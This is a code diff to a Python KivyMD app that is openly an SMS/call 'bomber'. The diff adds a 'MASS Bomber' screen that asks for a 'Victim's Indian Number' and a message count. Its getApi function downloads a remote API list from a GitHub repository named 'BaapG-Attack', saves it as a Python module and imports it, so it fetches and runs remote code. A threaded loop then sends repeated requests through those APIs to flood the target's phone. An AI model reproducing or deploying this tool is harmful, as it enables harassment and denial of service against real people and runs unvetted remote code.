@@ -181,7 +181,7 @@ MDScreen:
 		font_size : "20sp"
 		on_press : app.get_number()
 	MDRectangleFlatIconButton:
-		text : "   Sms+Call Bomber   "
+		text : "     MASS  Bomber     "
 		pos_hint : {"center_x":0.5,"center_y":0.55}
 		icon : "bomb"
 		icon_color : 0,0,0,1
@@ -190,6 +190,7 @@ MDScreen:
 		font_size : "20sp"
 		text_color: 0,0,0,1
 		line_color : 0,0,0,1
+		on_press : app.wp6()
 	MDRectangleFlatIconButton:
 		text : "  Whatsapp Bomber  "
 		pos_hint : {"center_x":0.5,"center_y":0.45}
@@ -243,7 +244,7 @@ MDScreen:
     		font_size : "30sp"
     		pos_hint : {"center_x":0.5,"center_y":0.90}
     	MDRectangleFlatIconButton:
-			text : " HOME "
+			text : "BACKGROUND PROCESS"
 			pos_hint : {"center_x":0.5,"center_y":0.35}
 			icon: "home"
 			on_press : app.home()  
@@ -252,7 +253,7 @@ phno="""
 MDScreen:
 	name:"phnno"
 	MDIconButton:
-        icon: "backburger"
+        icon: "arrow-left-circle"
         pos_hint: {"center_x":0.1, "center_y": 0.95}
         text: "Back"
         on_press : app.home()
@@ -317,7 +318,7 @@ wpb = """
 MDScreen:
 	name:"wpbomb"
 	MDIconButton:
-        icon: "backburger"
+        icon: "arrow-left-circle"
         pos_hint: {"center_x":0.1, "center_y": 0.95}
         text: "Back"
         on_press : app.home()
@@ -369,6 +370,94 @@ MDScreen:
 		icon: "send"
 		on_press : app.wpsend(input.text+input1.text,int(input2.text))
 """
+bombin = """
+MDScreen:
+	name:"bombin"
+	MDIconButton:
+        icon: "arrow-left-circle"
+        pos_hint: {"center_x":0.1, "center_y": 0.95}
+        text: "Back"
+        on_press : app.home()
+	MDLabel:
+		text : "Phone Number"
+		font_name : 'Poppins-Regular.ttf'
+		font_size : '35sp'
+		pos_hint : {"center_x":0.55,"center_y":0.90}
+	MDLabel:
+		text : "Enter CC and Number"
+		font_name : 'Poppins-Regular.ttf'
+		font_size : '20sp'
+		them_text_color : 'caption'
+		pos_hint : {"center_x":0.68,"center_y":0.85}
+	MDTextField:
+		id : input12
+		hint_text : "Victim's Indian Number"
+		mode:"rectangle"
+		halign :"center"
+		pos_hint : {"center_x":0.5,"center_y":0.65}
+		size_hint_y :0.10
+		size_hint_x : 0.6
+		required: True
+		max_text_length :10
+	MDTextField:
+		id : input23
+		hint_text : "Number of messages"
+		mode:"rectangle"
+		halign :"center"
+		pos_hint : {"center_x":0.5,"center_y":0.55}
+		size_hint_y :0.10
+		size_hint_x : 0.6
+		required: True
+		max_text_length : 2
+	MDRectangleFlatIconButton:
+		text : " SEND "
+		pos_hint : {"center_x":0.5,"center_y":0.45}
+		icon: "arrow-right-drop-circle"
+		on_press : app.bomb(int(input23.text),int(input12.text))
+"""
+counter = """
+MDScreen:
+	name : "counter"
+	MDLabel:
+		id : success
+		pos_hint : {"center_x":0.5,"center_y":0.80}
+		font_name : 'Poppins-Regular.ttf'
+		font_size : '20sp'
+		theme_text_color : "Custom"
+		text_color : 0,1,0,1
+		halign :"center"
+	MDLabel:
+		text : "Success"
+		pos_hint : {"center_x":0.5,"center_y":0.75}
+		font_name : 'Poppins-Regular.ttf'
+		font_size : '25sp'
+		theme_text_color : "Custom"
+		text_color : 0,1,0,1
+		halign :"center"
+	MDLabel:
+		id : fail
+		pos_hint : {"center_x":0.5,"center_y":0.70}
+		font_name : 'Poppins-Regular.ttf'
+		font_size : '20sp'
+		theme_text_color : "Custom"
+		text_color : 1,0,0,1
+		halign :"center"
+	MDLabel:
+		text : "Fail"
+		pos_hint : {"center_x":0.5,"center_y":0.65}
+		font_name : 'Poppins-Regular.ttf'
+		font_size : '25sp'
+		theme_text_color : "Custom"
+		text_color : 1,0,0,1
+		halign :"center"
+	MDRectangleFlatIconButton:
+		id : but
+		text : "Proceed"
+		pos_hint : {"center_x":0.5,"center_y":0.35}
+		icon : "home"
+		on_press : app.screen_manager.current = "success"
+		size_hint_y:0
+"""
 def test(ok):
 	screen_manager.current="success"	
 def wpbomb(number,times):
@@ -392,8 +481,31 @@ def check_intr():
 	except Exception as e:
 		return False
 	return  True
+def prepend_line(file_name, line):
+    dummy_file = file_name + '.bak'
+    with open(file_name, 'r') as read_obj, open(dummy_file, 'w') as write_obj:
+        write_obj.write(line + '\n')
+        for line in read_obj:
+            write_obj.write(line)
+    os.remove(file_name)
+    os.rename(dummy_file, file_name)
+
+
+def getApi(target):
+	apiUrl = "https://raw.githubusercontent.com/T-Dynamos/BaapG-Attack/main/apiData.baap"
+	try:
+		a = requests.get(apiUrl)
+		open('dataBa.py', 'wb').write(a.content)
+		prepend_line('dataBa.py',f'target = {target}')
+		import dataBa
+		from dataBa import apis, apidata
+	except Exception as e:
+		return exit(str(e))
+	return {"apis":apis,"apidata":apidata,"total":len(apis)}
+
 
 class MyApp(MDApp):
+	screen_manager = screen_manager
 	a = 0	
 	b = f"No internet {a}"
 	def wp(self):
@@ -413,6 +525,8 @@ class MyApp(MDApp):
 		screen_manager.add_widget(Builder.load_string(success))
 		screen_manager.add_widget(Builder.load_string(wpb))
 		screen_manager.add_widget(Builder.load_string(wp2))
+		screen_manager.add_widget(Builder.load_string(bombin))
+		screen_manager.add_widget(Builder.load_string(counter))
 		return screen_manager
 	def home(self):
 
@@ -445,8 +559,108 @@ class MyApp(MDApp):
 		else:
 			a =+1 
 			screen_manager.current = "netof"
+	def wp6(self):
+		screen_manager.current = "bombin"
+	def bomb(self,times2, number):
+		finalApi = getApi(number)		
+		apis = finalApi["apis"]
+		total = finalApi["total"]
+		times1 = round(times2/total)
+		if times1 == 0:
+			times1 = 1
+		args = (times1,number,apis)
+		ui = """
+MDScreen:
+	name : "temp"
+	MDIconButton:
+        icon: "arrow-left-circle"
+        pos_hint: {"center_x":0.1, "center_y": 0.95}
+        text: "Back"
+        on_press : app.home()
+	MDLabel:
+		text : "Gearing up API"
+		font_name : 'Poppins-Regular.ttf'
+		font_size : '35sp'
+		pos_hint : {"center_x":0.55,"center_y":0.90}
+	MDLabel:
+		text : "Api Credits to Ansh Dadwal"
+		font_name : 'Poppins-Regular.ttf'
+		font_size : '20sp'
+		them_text_color : 'caption'
+		pos_hint : {"center_x":0.55,"center_y":0.82}
+	MDLabel:
+		text: "Total Apis : """+str(total)+""""
+		font_name : 'Poppins-Regular.ttf'
+		font_size : '15sp'
+		them_text_color : 'caption'
+		pos_hint : {"center_x":0.68,"center_y":0.65}
+	MDLabel:
+		text: "Total times : """+str(screen_manager.get_screen('bombin').ids.input23.text)+""""
+		font_name : 'Poppins-Regular.ttf'
+		font_size : '15sp'
+		them_text_color : 'caption'
+		pos_hint : {"center_x":0.68,"center_y":0.60}
+	MDRectangleFlatIconButton:
+		text : " START "
+		pos_hint : {"center_x":0.5,"center_y":0.35}
+		icon: "arrow-right-drop-circle"
+		on_press : app.top()"""
+		screen_manager.add_widget(Builder.load_string(ui))
+		
+		screen_manager.current = "temp"
+		
+	def top(self):
+		screen_manager.current = "counter"
+		screen_manager.get_screen('counter').ids.success.text = str(0)
+		screen_manager.get_screen('counter').ids.fail.text = str(0)
+		import _thread
+		_thread.start_new_thread(self.startBomb,())
+	def startBomb(self):
+		finalApi = getApi(screen_manager.get_screen('bombin').ids.input12.text)		
+		apis = finalApi["apis"]
+		total = finalApi["total"]
+		times1 = round(int(screen_manager.get_screen('bombin').ids.input23.text)/total)
+		if times1 == 0:
+			times1 = 1		
+		success =0
+		fail =0	
+			
+		for i in range(0,times1):
+			for api in apis:
+				if "POST" in api:
+					url,data,head,method,check = api
+					try:
+						a = requests.post(url,data=data,headers=head)
+						if check in a.text:
+							success += 1
+						else:
+							print (a.text,url)
+							fail += 1
+					except Exception as e:
+						print(str(e))
+						fail += 1
+					screen_manager.get_screen('counter').ids.success.text = str(success)
+					screen_manager.get_screen('counter').ids.fail.text = str(fail)					
 
-
+				elif "GET" in api:
+					url,head,method,check = api
+					try:
+						a = requests.get(url,headers=head)
+						if check in a.text:
+							success += 1
+						else:
+							print(a.text)
+							fail += 1
+					except Exception as e:
+						print(str(e))
+						fail += 1
+					screen_manager.get_screen('counter').ids.success.text = str(success)
+					screen_manager.get_screen('counter').ids.fail.text = str(fail)
+				else:
+					print ("Unexpectedly Error")
+					return exit()			
+			continue
+		screen_manager.get_screen('counter').ids.but.size_hint_y = None
 
                  
 if __name__ == "__main__" :
